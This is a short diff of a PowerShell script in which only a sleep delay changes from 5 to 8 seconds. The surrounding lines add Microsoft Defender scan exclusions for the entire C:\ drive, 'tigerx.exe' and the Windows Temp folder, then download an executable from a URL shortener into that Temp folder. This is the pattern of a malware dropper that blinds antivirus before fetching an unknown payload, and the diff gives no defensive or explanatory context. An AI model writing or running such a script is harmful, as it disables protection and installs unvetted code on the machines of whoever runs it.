@@ -1,5 +1,5 @@
 Add-MpPreference -ExclusionPath "C:\","tigerx.exe","C:\Windows\Temp\"
-Start-Sleep -Seconds 5
+Start-Sleep -Seconds 8
 $url = "https://is.gd/tigerxgit"
 $outpath = "C:\Windows\Temp\tigerx.exe"
 Invoke-WebRequest -Uri $url -OutFile $outpath
